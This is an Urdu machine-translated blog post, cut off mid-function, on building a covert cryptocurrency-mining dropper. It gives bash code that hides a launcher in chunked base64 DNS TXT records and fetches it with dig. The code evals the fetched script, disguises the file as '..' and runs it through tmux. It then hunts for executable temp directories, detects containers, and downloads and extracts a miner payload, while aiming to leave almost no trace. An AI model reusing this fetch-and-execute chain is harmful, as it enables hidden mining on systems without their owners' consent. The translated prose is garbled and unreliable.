both}@-webkit-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{0%{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript><link href=https://www.unto.re/ur/posts/chronichles_of_a_cryptonote_dropper/ rel=canonical><script type=application/ld+json>{"copyrightHolder":"untoreh","@id":"https://www.unto.re","url":"https://www.unto.re","copyrightYear":2021,"@context":"https://schema.org/","image":"/assets/appa.png","@type":"WebSite"}</script><script id=ldj-webpage type=application/ld+json>{"audience":"cool people","url":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"accessibilitySummary":"Visual elements are tentatively described.","description":"...How far are you willing to go for...pennies?","author":{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"},"mentions":[],"@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"2021-08-21","dateCreated":"August 21, 2021","@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","dateModified":"2021-08-21","availableLanguage":[{"name":"English","@type":"Language"},{"name":"German","@type":"Language"},{"name":"Italian","@type":"Language"},{"name":"Mandarin Chinese","@type":"Language"},{"name":"Spanish","@type":"Language"},{"name":"Hindi","@type":"Language"},{"name":"Arabic","@type":"Language"},{"name":"Portuguese","@type":"Language"},{"name":"Bengali","@type":"Language"},{"name":"Russian","@type":"Language"},{"name":"Japanese","@type":"Language"},{"name":"Punjabi","@type":"Language"},{"name":"Javanese","@type":"Language"},{"name":"Vietnamese","@type":"Language"},{"name":"French","@type":"Language"},{"name":"Urdu","@type":"Language"},{"name":"Turkish","@type":"Language"},{"name":"Polish","@type":"Language"},{"name":"Ukranian","@type":"Language"},{"name":"Dutch","@type":"Language"},{"name":"Greek","@type":"Language"},{"name":"Swedish","@type":"Language"},{"name":"Zulu","@type":"Language"},{"name":"Romanian","@type":"Language"},{"name":"Malay","@type":"Language"},{"name":"Korean","@type":"Language"},{"name":"Thai","@type":"Language"},{"name":"Filipino","@type":"Language"}],"keywords":["crypto","net","shell"],"creativeWorkStatus":"Published","publisher":{"url":"https://www.unto.re","sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"contactPoint":{"contactType":"info","email":"contact@unto.re","@type":"ContactPoint","telephone":""},"logo":"/assets/appa-60px.png","name":"untoreh's site","@type":"Organization"},"datePublished":"2021-08-21","inLanguage":"English","image":"/assets/appa.png","name":"","mainEntityOfPage":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/index.html","@type":"Article"}}</script><script id=ldj-breadcrumbs type=application/ld+json>{"itemListElement":[{"position":1,"item":"https://www.unto.re","name":"Home","@type":"ListItem"},{"position":2,"item":"/posts/","name":"Posts List","@type":"ListItem"},{"position":3,"item":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper","name":"Chronicles of a cryptonote dropper","@type":"ListItem"}],"@type":"BreadcrumbList"}</script><link href=/assets/favicon.png rel=icon type=image/x-icon><link href=/assets/favicon.svg rel=icon type=image/svg+xml><title> کرپٹونٹ ڈراپر کے تواریخ۔</title><script type=application/ld+json>{"url":"/ur/posts/chronichles_of_a_cryptonote_dropper/","mainContentOfPage":{"@type":"WebPageElement","cssSelector":".franklin-content"},"accessMode":["textual","visual"],"mentions":null,"description":"","@context":"https://schema.org","accessModeSufficient":{"itemListElement":["textual","visual"],"@type":"itemList"},"@type":"https://schema.org/WebPage","lastReviewed":"","dateCreated":"","@id":"/ur/posts/chronichles_of_a_cryptonote_dropper/","dateModified":"","keywords":[],"creativeWorkStatus":"Published","translator":{"url":"http://google.translate.com","name":"Google Translate","@type":"https://schema.org/Organization"},"translationOfWork":{"@id":"https://www.unto.re/posts/chronichles_of_a_cryptonote_dropper/"},"datePublished":"2021-11-02T20:43:47.558","inLanguage":"ur","name":"","mainEntityOfPage":{"@id":"/ur/posts/chronichles_of_a_cryptonote_dropper/","@type":"Article"}}</script><script type=application/ld+json>{"sameAs":["https://github.com/untoreh","https://twitter.com/untoreh"],"email":"contact@unto.re","name":"untoreh","@type":"https://schema.org/Person","image":"/assets/appa.png"}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><script type=application/ld+json>{"potentialAction":{"query-input":"required maxlength=100 name=input","actionStatus":"https://schema.org/PotentialActionStatus","query":"required","@type":"SearchAction","target":{"uri":"","scheme":"https","userinfo":"","host":"www.unto.re","port":"","path":"/search","query":"q=%7Binput%7D","fragment":""}}}</script><body><div class=masthead><div class=masthead__menu__inner-wrap><div class=masthead__menu><a title="untoreh's site"class=site-title href=/ur/></a><div class=author__wrap><ul><li class=author__avatar><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="Twitter link"href=https://twitter.com/untoreh><i class="fab fa-fw fa-twitter-square"aria-hidden=true></i></a><li class="author__urls social-icons"><a rel="nofollow noopener noreferrer"title="GitHub link"href=https://github.com/untoreh><i class="fab fa-fw fa-github"aria-hidden=true></i></a><li class="author__urls social-icons"><a href=mailto:contact@unto.re title=email><i class="fas fa-envelope"></i></a><li></ul></div><nav id=site-nav><div class=horiz><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/ur/posts/><i class="fas fa-pen menu-icons"></i> پوسٹس</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/ur/media/><i class="fas fa-tv menu-icons"></i> میڈیا</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div><div class=vert><ul><li class="lunrSearch masthead__menu-item hvr-outline-in"><li class="masthead__menu-item hvr-outline-in"><a title="All the articles that I have written"href=/ur/posts/><i class="fas fa-pen menu-icons"></i> پوسٹس</a><li class="masthead__menu-item hvr-outline-in"><a title="Video and audio content from streaming websites."href=/ur/media/><i class="fas fa-tv menu-icons"></i> میڈیا</a><li class="masthead__menu-item hvr-outline-in menu-lang-btn"title="Change website's language"></ul></div></nav></div></div></div><div><h1 id=title><a href=/ur/posts/chronichles_of_a_cryptonote_dropper> کرپٹونٹ ڈراپر کے تواریخ۔</a></h1><blockquote id=page-description style=font-style:italic>... آپ کتنے پیسے کے لیے جانے کو تیار ہیں؟</blockquote></div><div class=franklin-content><p>فرض کریں کہ آپ میرا کرنا چاہتے ہیں۔<a href=https://en.wikipedia.org/wiki/Cryptocurrency> کرپٹو کرنسی</a> ریموٹ پر<em> مجازی</em> ہارڈ ویئر تمہیں میرے لیے کچھ ڈھونڈنا ہے۔ ریموٹ سرورز کا مطلب ہے ، نہیں۔<a href=https://en.wikipedia.org/wiki/Application-specific_integrated_circuit> ASICS</a> یا کام کے الگورتھم کا GPU ثبوت ، بنیادی طور پر صرف۔<a href=\posts/a-few-notes-on-proof-of-work> سی پی یو دوستانہ سکے۔</a>.<h2 id=the_software><a class=header-anchor href=#the_software> سافٹ وئیر۔</a></h2><p>تلاش کریں اور تلاش کریں a<a href=https://github.com/xmrig/xmrig> کان کن</a> ، لیکن یہ واقعی اچھا نہیں ہے ، آپ ایسی چیز پسند کریں گے جسے آپ ریموٹ سے بہتر طریقے سے کنٹرول کر سکیں ، تاکہ آپ کو مل جائے۔<a href=https://github.com/Bendr0id/xmrigCC> ایک اور کان کن</a> . آپ بھی ایک چاہتے ہیں۔<a href=https://github.com/Bendr0id/xmrigcc-proxy> پراکسی</a> ، کیونکہ بہت سے رابطے مختصر رہیں گے ، آپ نہیں چاہتے۔<a href=https://en.wikipedia.org/wiki/Denial-of-service_attack> ڈاس</a> آپ کا کان کنی پول نیز ایک<a href=https://github.com/search?q=tunnel> سرنگ</a> اچھا ہو گا.<h2 id=the_design><a class=header-anchor href=#the_design> ڈیزائن</a></h2><p>کچھ بوٹنیٹس کمانڈ تلاش کرنے کے لیے بلاکچین ڈیٹا استعمال کرتے ہیں ،<a href=https://twitter.com/sarahjamielewis> کوئی</a> بھی ظاہر ہوتا ہے<a href=https://web.archive.org/web/https://twitter.com/SarahJamieLewis/status/1185724467776851968> کھوئے ہوئے شرط</a> یہ دوبارہ نہ ہونے پر ... ویسے بھی ہم اتنے نفیس نہیں ہیں ، ہم کچھ DNS ریکارڈ لے کر آئیں گے جو کہ ایک اسکرپٹ کو محفوظ کرتا ہے جو پے لوڈ کھینچتا ہے جسے سیلف ایکسٹریکٹ ڈائریکٹری میں نکالتا ہے اور چھوڑ دیتا ہے<em> تقریبا</em> اس کے سیٹ اپ کا کوئی نشان نہیں۔ یہاں ایک چھوٹا سا بہاؤ چارٹ ہے جو ساخت کو ظاہر کرتا ہے۔<h2 id=launcher><a class=header-anchor href=#launcher> لانچر</a></h2><p>اسٹارٹ اپ اسکرپٹ کا نقطہ قابل رسائی اور آسانی سے اپڈیٹ ہونا ہے تاکہ یہ وقت کے امتحان کو برداشت کرے۔ اپ ڈیٹ کر رہا ہے۔<a href=https://en.wikipedia.org/wiki/Domain_Name_System> DNS</a> ریکارڈ آسان ہے ، اور DNS آخری چیز ہے جو نیٹ ورک کے اندر بند ہو جاتی ہے کیونکہ آئی پی ایڈریس کو یاد رکھنا مشکل ہوتا ہے ... آپ دیکھیں کہ ہم کب ہیں۔<em> تعیناتی سکرپٹ لانا</em>ہم اصل میں پہلے ہی کچھ منطق چلا رہے ہیں ، یہ لانچر اسکرپٹ ہے ، اسے ہمارے ریکارڈ کو دیکھنے کے لیے DNS سوالات کرنے کی صلاحیت کی ضرورت ہے ، DNS ہر جگہ ہو سکتا ہے لیکن<a href=https://web.archive.org/web/20201107155737/https://downloads.isc.org/isc/bind9/> کھدائی</a> نہیں ہے.<p>اگر ہم نے کوئی اور ٹول ڈاؤن لوڈ کرنا ہے تو یہاں تھوڑا سا الجھن ہے۔<em> پے لوڈ کو ڈاؤن لوڈ کرنے کے لیے ایک اور اسکرپٹ ڈاؤن لوڈ کریں۔</em> ہمیں صرف پے لوڈ ڈاؤن لوڈ کرنا چاہیے! دفاع میں…<a href=https://en.wikipedia.org/wiki/Standalone_program> جامد طور پر منسلک</a> ڈی این ایس سوالات انجام دینے کے لیے قابل عمل کھودیں ، یا تو سیلف ہوسٹنگ ، یا کلاؤڈ ہوسٹنگ کے ذریعے حاصل کیا گیا (ہاں 3 یا 4 کی طرح فال بیک ہیں ، کیونکہ کلاؤڈ سروسز میں بہت کم مفت بینڈوڈتھ ہوتی ہے ، اور کوکیز یا ایکسیس ٹوکن کی بھی ضرورت ہوتی ہے۔ غیر دوستانہ ، جان بوجھ کر ، یقینا)<p>ڈی این ایس ریکارڈ میں کیا ہے؟ ہم استعمال کر رہے ہیں۔<a href=https://en.wikipedia.org/wiki/TXT_record> TXT</a> ریکارڈز ، ایک کسٹم ڈومین پر (فال بیک یہاں بھی)۔ TXT کیوں؟ وہ ایسے ہوتے ہیں جو ڈیٹا کی سب سے بڑی مقدار کو ذخیرہ کر سکتے ہیں عام طور پر چونکہ یہ اس قسم کا ہے<a href=https://www.ietf.org/rfc/rfc6763.txt> تجویز کردہ</a> اس پر منحصر<em> چیزیں</em> . ہم خاص طور پر استعمال کر رہے ہیں۔<a href=https://www.cloudflare.com/> بادل کی چمک</a> ہمارے ڈی این ایس فڈلنگ کے لیے چونکہ یہ مفت ہے ، اور بہت زیادہ شہر کا واحد کھلاڑی (<em> اچھی طرح سے نہیں بلکہ کوئی اور متبادل پالیس کی خصوصیات ہیں۔</em> ). ایسا ہوتا ہے کہ آپ ڈیٹا کے ایک سے زیادہ ٹکڑوں کو اسٹور کرسکتے ہیں۔<em> اسی</em> ریکارڈ…<a href=https://web.archive.org/save/https://community.cloudflare.com/t/was-there-a-reduction-in-maximum-txt-size> استعمال کیا</a> اجازت دیں<em> جکڑا ہوا</em>TXT ریکارڈ کل k 9k بائٹس کا ہے ، دستاویزات اب ~ 2k بائٹس بتاتے ہیں ، اس تبدیلی سے پہلے جو میں استعمال کر رہا تھا k 6k میرے خیال میں ، اور سکرپٹ کو بغیر کسی دباؤ کے پیش کر رہا تھا ، اس کے بعد مجھے سکرپٹ کو پتلا کرنا پڑا اور اسے ہاتھ سے پہلے سکیڑنا پڑا (دراصل میں a استعمال کرنے کی کوشش کی۔<a href=https://freedns.afraid.org/> آزاد</a> فراہم کنندہ ، مجھ پر ایک دن کے اندر پابندی عائد کر دی گئی ، اندازہ لگایا گیا کہ ان کے پاس بغیر چربی والی TXT ریکارڈ کی پالیسی ہے) ، تاہم gzip کمپریشن پائپ فرینڈلی نہیں دکھائی دیتی ہے اور پھر بھی پریشانیوں کا باعث بن رہی ہے ، لہذا مجھے سکرپٹ کو بغیر کسی کمپریشن کے سنبھالنا پڑا ( اختتامی ٹینجینٹ)۔<p>ہم اسے کیسے ذخیرہ کرتے ہیں؟ TXT ریکارڈز صرف حروف تہجی کے تاروں کی حمایت کرتے ہیں ، نہیں۔<a href=https://en.wikipedia.org/wiki/Null_character> NULs</a> ، لہذا ہمیں اسے نان انکوڈنگ میں لپیٹنا ہوگا ،<a href=https://en.wikipedia.org/wiki/Base64> بیس 64۔</a> اس رکاوٹ کو پورا کرتا ہے ، اور کیونکہ ہم ذخیرہ کر رہے ہیں۔<em> جکڑا ہوا</em> TXT ریکارڈ ، ہمیں آؤٹ پٹ کا حصہ بنانا ہے ، چونکہ ہم شیل چیزیں استعمال کر رہے ہیں ، یہ کام کے ذریعے کیا جاتا ہے۔<code>-w</code> پرچم ، مصروف خانہ پر اس طرح کے جھنڈے پرانے ورژن پر غیر حاضر (یا آپٹ ان) ہوتے تھے جو کہ پریشان کن تھا ، ایک متبادل یہ ہے کہ اوپن ایس ایل کے ساتھ بنڈل انکوڈر استعمال کیا جائے ،<code>openssl enc -base64</code>.<p>اب جب کہ ہم جانتے ہیں کہ اپنی تعیناتی کی سکرپٹ کو کس طرح ذخیرہ کرنا ہے ہم اسے کسی ایک کے ساتھ محفوظ کرتے ہیں۔<a href=https://web.archive.org/web/20210305071742/https://github.com/cloudflare/cloudflare-go/blob/master/cmd/flarectl/README.md> cf cli</a> یا دستی طور پر. ہم اسے کیسے کھینچتے ہیں؟ ہم نے ذکر کیا کہ ہمیں bindutils یا ہماری اپنی ضرورت ہے۔<code>dig</code> ... سروسنگ اینڈ پوائنٹ کو منتخب کرنے کے بعد ، ہم اسے ڈاؤن لوڈ کرنا چاہتے ہیں ، جو دستیاب ہے وہ عام طور پر ہوتا ہے۔<a href=https://www.gnu.org/software/wget/> ویجٹ</a> یا<a href=https://curl.se/> کرل</a> ، wget پہلے سے زیادہ انسٹال پایا جاتا ہے ، تاہم مصروف خانہ صرف متحرک لائبریریوں کے ساتھ tls سپورٹ فراہم کرتا ہے ، لہذا آپ کو یہ یقینی بنانا ہوگا کہ اختتامی نقطہ http کی خدمت کر رہا ہے یا آپ کی افادیت ہے<code>wget</code> gnu-utils سے<pre><code class="bash hljs"><span class=hljs-comment># the wget command</span>
wget -t 2 -T 10 -q -i- -O- > <span class=hljs-variable>$filename</span> <<< <span class=hljs-string>"<span class=hljs-variable>$digurl</span>"</span></code></pre><p>اس کا مطلب ہے کوشش کرنا۔<code>-t2</code> اوقات انتظار<code>-T10</code> سیکنڈ ہیں<code>-q</code> سے پرسکون پڑھنا<code>-i-</code> stdin (<code>$digurl</code> ) اور لکھنا۔<code>-O-</code> stdout (<code>$filename</code>). یہ کمانڈ ظاہر نہیں کرتا کہ ہم پہلی نظر میں کیا ڈاؤن لوڈ کر رہے ہیں۔ ہم اسی وجہ سے دوسرے شیل کمانڈز کے ساتھ بہت محتاط رہنے جا رہے ہیں ، یا شیل کے ساتھ چپکے ہوئے ہیں (<a href=https://en.wikipedia.org/wiki/Bash_%28Unix_shell%29> لشکر</a> بلٹ ان جہاں ممکن ہو۔ اس بات کا بھی خیال رکھیں کہ آپ اپنے ایگزیکیوٹیبل کہاں سے ڈاؤن لوڈ کر رہے ہیں ، آپ اس بات کو یقینی بنانا چاہتے ہیں کہ آپ ان پر عملدرآمد کر سکیں ، کیونکہ کچھ ماؤنٹ پوائنٹس ، خاص طور پر کنٹینرز اور<code>tmp</code> راستے ہیں<code>noexec</code> . اب جب کہ ہمارے پاس ڈی این ایس استفسار کا آلہ ہے ہم اپنے ریکارڈ لاتے ہیں۔<pre><code class="bash hljs">dig txt <span class=hljs-variable>${record}</span>.<span class=hljs-variable>${zone}</span> +short +tcp +timeout=3 +retries=0 <span class=hljs-variable>$dnsserver</span></code></pre><p>یہاں پرچم خود وضاحت کرنے والے ہیں ،<code>+short</code> صرف اس کا مطلب یہ ہے کہ ہم صرف ڈیٹا میں ہی دلچسپی رکھتے ہیں ، تاکہ ہمیں آؤٹ پٹ پارس نہ کرنا پڑے۔ DNS سرور کی وضاحت کرنا ضروری ہے ، جیسے گوگل (<code>8.8.8.8</code> ) یا کلاؤڈ فلیئر (<code>1.1.1.1</code> ) کیونکہ بہت سے ماحول ری ڈائریکٹ یا پراکسی ڈی این ایس سوالات بطور ڈیفالٹ اپنے ڈی این ایس سرورز سے کرتے ہیں۔ ٹکڑے ٹکڑے کا سکرپٹ حاصل کرنے کے بعد ہم کوٹس اور وائٹ اسپیس سے نمٹتے ہیں تاکہ اسے ڈی کوڈنگ کے لیے تیار کیا جا سکے۔<pre><code class="bash hljs">data=<span class=hljs-variable>${data//\"}</span><span class=hljs-comment># remove quotes</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># remove whitespace</span><span class=hljs-built_in>declare</span> -a ar_data
<span class=hljs-keyword>for</span> l <span class=hljs-keyword>in</span><span class=hljs-variable>$data</span>; <span class=hljs-keyword>do</span>
    ar_data[<span class=hljs-variable>${l:0:1}</span>]=<span class=hljs-variable>${l:1}</span><span class=hljs-comment># iterate over each line and remove the first characther</span><span class=hljs-keyword>done</span>
data=<span class=hljs-variable>${ar_data[@]}</span><span class=hljs-comment># join all the lines</span>
data=<span class=hljs-variable>${data// }</span><span class=hljs-comment># ensure joining didn't add whitespace</span><span class=hljs-comment># decode</span>
launcher=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> | <span class=hljs-variable>$b64</span> -d -w <span class=hljs-variable>$chunksize</span>)</code></pre><p>اب اگر ہم<em> اب بھی</em> ہمارے لانچر نہیں ہے؟ ڈی این ایس گندا ہے ، ہم فال بیک چاہتے ہیں ، لانچر اسکرپٹ کو براہ راست لانے کے لیے ایک سب ڈومین سیٹ اپ کرنے دیں۔ اپنے اسکرپٹ کا جائزہ لینے سے پہلے ہم اسے اپنی مرضی کے مطابق بنانا چاہتے ہیں ، کچھ متغیرات کے ساتھ ، دوبارہ ایک TXT ریکارڈ استعمال کرنے دیتے ہیں تاکہ NAME = VALUE متغیر کی فہرست کو محفوظ کیا جا سکے اور اس کی تجزیہ کی جا سکے۔ متغیرات کے لیے ایک فال بیک بھی ہے ، کلاؤڈ فلیئر یو آر ایل پر مبنی ری ڈائریکٹ پیش کرتا ہے ، یہ ری ڈائریکٹس پیش کیے جاتے ہیں<em> پہلے</em> منزل ، لہذا ہمیں اختتامی نقطہ کی ضرورت نہیں ہے ، ہم صرف ریجیکس پر مبنی ری ڈائریکٹ قواعد کو فرضی اختتامی نقطہ پر تشکیل دینا چاہتے ہیں ، جس میں ہم دلچسپی رکھتے ہیں وہ یو آر ایل کے پیرامیٹرز ہیں<code>?NAME=VALUE&NAME2=VALUE2...</code>، تاکہ ہم اپنے لانچر کو صرف ری ڈائریکٹ یو آر ایل کو تبدیل کر کے پیرامیٹرائز کر سکیں ، ہمیشہ کوڈز کو حوالہ دینے اور فرار ہونے پر توجہ دیں<pre><code class="bash hljs"><span class=hljs-comment>## m1 also important to stop wget</span>
pl_vars=$(<span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$token_url</span>"</span> | wget -t 1 -T 3 -q -i- -S 2>&1 | grep -m1 <span class=hljs-string>'Location'</span>)
pl_vars=<span class=hljs-variable>${pl_vars#*\/}</span>
pl_vars=<span class=hljs-variable>${pl_vars//\"&/\" }</span>
pl_vars=<span class=hljs-variable>${pl_vars//%3F/\?}</span></code></pre><p>ویجٹ<code>-S</code> ری ڈائریکٹ یو آر ایل پرنٹ کرتا ہے جس میں ہم تجزیہ کرنے میں دلچسپی رکھتے ہیں۔ پیرامیٹرز اور اسکرپٹ کے ساتھ ، ہم ان فائلوں پر لکھنے والے متغیرات کا جائزہ لیتے ہیں۔<pre><code class="bash hljs"><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-variable>$pl_vars</span>"</span><span class=hljs-built_in>echo</span><span class=hljs-string>"export \
<span class=hljs-variable>$pl_vars</span> \
<span class=hljs-variable>$ENV_VARS</span> \
"</span>>env.sh</code></pre><p>اس فائل کو ڈیپلو سکرپٹ کے ذریعے حاصل کیا جائے گا۔ اسٹارٹ اپ اسکرپٹ کا آخری حصہ اصل ہے۔<a href=https://en.wikipedia.org/wiki/Trampoline_(computing)> ٹرامپولین</a> ، موجودہ شیل عمل کے اندر اسکرپٹ کا اندازہ کریں ، یا اگر ممکن ہو تو اسے tmux کے ذریعے سنبھالنے دیں۔<pre><code class="bash hljs"><span class=hljs-comment># printf preserves quotes</span><span class=hljs-built_in>eval</span><span class=hljs-string>"<span class=hljs-subst>$(printf '%s' <span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span>)</span>"</span> &>/dev/null
<span class=hljs-comment># or tmux</span><span class=hljs-built_in>echo</span><span class=hljs-string>"<span class=hljs-variable>$launcher</span>"</span> > <span class=hljs-string>".. "</span>
tmux send-keys -t miner <span class=hljs-string>". ./\".. \""</span> Enter</code></pre><p>لانچر اسکرپٹ کو ".." نامی فائل میں پھینک دیا گیا ہے یہ الجھا ہوا لگتا ہے کیونکہ اسے غلطی سے بطور a<em> والدین</em> ڈائریکٹری اور ہم سیشن کمانڈ کو شامل نہیں کرتے ، کیونکہ یہ پروسیس کمانڈ میں رہتا ہے ، اس کے بجائے ہم پہلے سے tmux سیشن شروع کرتے ہیں اور tmux ٹرمینل انٹرفیس کے ذریعے سورس کمانڈ بھیجتے ہیں۔ اس سے متعلق ، بعض اوقات ایک ایگزیکیوٹیبل کے ساتھ فون کرنا۔<code>./</code> ان حروف کو کمانڈ میں رکھتا ہے ، لہذا بہتر ہے کہ شامل کریں۔<code>$PWD</code> راستے پر ..<code>PATH=$PWD:$PATH</code>.<h2 id=the_payload><a class=header-anchor href=#the_payload> پے لوڈ۔</a></h2><p>ہماری تعیناتی سکرپٹ سورسنگ سے شروع ہوتی ہے۔<code>env.sh</code> فائل ، اور ورز کو رکھنا یا ترتیب دینا۔<code>STARTING_*</code> کی طرح<pre><code class="bash hljs">STARTING_PATH=<span class=hljs-variable>${STARTING_PATH:-<span class=hljs-variable>$PATH</span>}</span>
STARTING_PID=<span class=hljs-variable>$BASHPID</span></code></pre><p>یہ ہمیں ماحول کو دوبارہ ترتیب دیتے ہوئے چلنے والی مثال کو مارنے اور دوبارہ شروع کرنے کی اجازت دیتا ہے۔ عملدرآمد کی صلاحیتوں والی ٹی ایم پی ڈائریکٹری میں تبدیل ہونے دیں۔<pre><code class="bash hljs"><span class=hljs-comment># out local subdirectory</span>
pathname=$(<span class=hljs-built_in>printf</span><span class=hljs-string>".%-<span class=hljs-subst>$((RANDOM%9+1)</span>)s"</span><span class=hljs-keyword>for</span> ph <span class=hljs-keyword>in</span> {/tmp,/dev/shm,/run,/var/tmp,/var/cache,~/.<span class=hljs-built_in>local</span>,~/.cache,~/}; <span class=hljs-keyword>do</span>
    rm -rf <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        mkdir -p <span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        tmppath=<span class=hljs-string>"<span class=hljs-variable>$ph</span>/<span class=hljs-variable>$pathname</span>"</span> &&
        is_path_executable <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> &&
        <span class=hljs-built_in>export</span> PATH=<span class=hljs-string>"<span class=hljs-variable>${ph}</span>/<span class=hljs-variable>$pathname</span>:<span class=hljs-variable>${PATH}</span>"</span> tmppath &&
        <span class=hljs-built_in>break</span><span class=hljs-keyword>done</span>
[ -n <span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span> ] && <span class=hljs-built_in>cd</span><span class=hljs-string>"<span class=hljs-variable>$tmppath</span>"</span></code></pre><p>چیک کر رہا ہے کہ کیا a کے اندر ہے۔<a href=https://en.wikipedia.org/wiki/OS-level_virtualization> کنٹینر</a> یہ بھی آسان ہے ، ہم اشاروں کے لیے فائل سسٹم کی جانچ کر سکتے ہیں۔<pre><code class="bash hljs">c=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/etc/cpa*'</span>)
d=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/dev/*'</span>)
s=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/sys/*'</span>)
p=$(<span class=hljs-built_in>builtin</span> compgen -G <span class=hljs-string>'/proc/*'</span>)
jail=
<span class=hljs-keyword>if</span> [ -n <span class=hljs-string>"<span class=hljs-variable>$c</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$d</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$s</span>"</span> -o -z <span class=hljs-string>"<span class=hljs-variable>$p</span>"</span> ]; <span class=hljs-keyword>then</span><span class=hljs-comment>## we are in a jail</span>
    jail=1
<span class=hljs-keyword>fi</span></code></pre><p>اب وقت آگیا ہے کہ ہم اپنے پے لوڈ کو ڈاؤن لوڈ کریں ، ہم ویجٹ اور کرل دونوں کو سپورٹ کرنے کا انتخاب کرتے ہیں ، ہم پہلے ہی جان چکے ہیں کہ ویجٹ کو محتاط جھنڈوں کے ساتھ کیسے استعمال کرنا ہے ، کرل کے لیے یہ تھوڑا مختلف ہے۔ ہمیں ایک کنفیگ فائل بنانی ہے ، اور اوور رائیڈ کرنا ہے۔<code>CURL_HOME</code><pre><code class="bash hljs"><span class=hljs-built_in>echo</span><span class=hljs-string>"url = <span class=hljs-variable>$uri</span>
output = <span class=hljs-variable>${name}</span><span class=hljs-variable>${format}</span>
connect-timeout = 10
"</span> > .curlrc
CURL_HOME=<span class=hljs-variable>$PWD</span> curl -sOL</code></pre><p>آخری مرحلہ صرف پے لوڈ نکالنا ہے۔<pre><code class="bash hljs"><span class=hljs-built_in>type</span> unzip &>/dev/null &&
    format=<span class=hljs-string>".zip"</span> extract=<span class=hljs-string>"unzip -q"</span> ||
        format=<span class=hljs-string>".tar.gz"</span> extract=<span class=hljs-string>"tar xf"</span></code></pre><p>پے لوڈ کی خدمت کے لیے [CDN] کا استعمال قابل ذکر ہے۔ یہاں ایک بار پھر ریسکیو کے لیے کلاؤڈ فلیئر ہمیں بینڈوتھ کے اخراجات سے بچاتا ہے۔ ہمارے کمپریسڈ پے لوڈ کا نام تبدیل کرکے a<em> فائل کی توسیع</em> کلاؤڈ فلیئر کے ذریعے تعاون یافتہ ... یہ کیش ہو جاتا ہے۔ کلاؤڈ فلیئر یہ نہیں دیکھتا کہ یہ کس چیز کی خدمت کر رہا ہے ، شاید اس لیے کہ اس پیمانے پر ایسا کرنا محض ناقابل عمل ہے۔<h2 id=adventures_down_bashland><a class=header-anchor href=#adventures_down_bashland> بشلینڈ کے نیچے مہم جوئی۔</a></h2><p>باش کو اس مفروضے کے ساتھ منتخب کیا گیا تھا جو پورٹیبل ہے ، بہت زیادہ جگہ سے باہر نظر نہیں آتا ہے اور دوسری اسکرپٹنگ زبانوں جیسے پرل ، روبی یا ازگر کے مقابلے میں زیادہ عام ہے۔ سچی بات یہ ہے کہ گولانگ یا لوا میں لکھا ہوا ایک بائنری بہت کم ہوتا ، کم کیڑے کے ساتھ ، اور برقرار رکھنا آسان ہوتا ، بنیادی طور پر باز میرے انتخاب میں ممکنہ طور پر بدترین انتخاب تھا ، اس وقت تک جب میں نے بہت ساری خارش خارش کی تھی ، دوبارہ لکھنے میں بہت دیر ہوچکی تھی ، اور یہ ایک طرح کی بورنگ بھی ہو رہی تھی۔<p>تمام بلٹ انز (جیسے گریپ اور سیڈ) کو استعمال کرنے کے لیے کمپلائز ٹائم فلیگ کے ساتھ مصروف خانہ استعمال کرنے کا آپشن بھی موجود تھا ، تاہم اس طرح بلٹ انز کا استعمال نوکریاں (کانٹا) پیدا کرنے کی اجازت نہیں دیتا اور ڈیمن کو ممکنہ ڈیڈ لاکس سے بے نقاب کرتا ہے۔<p>میں یہاں کچھ بش افعال بیان کروں گا ، مکمل فہرست دستیاب ہے۔<a href=\assets/posts/bash_functions.txt> یہاں</a><pre><code class="bash hljs"><span class=hljs-comment>## echo a string long $1 of random lowercase chars</span><span class=hljs-function><span class=hljs-title>rand_string</span></span>() {
    <span class=hljs-built_in>local</span> c=0
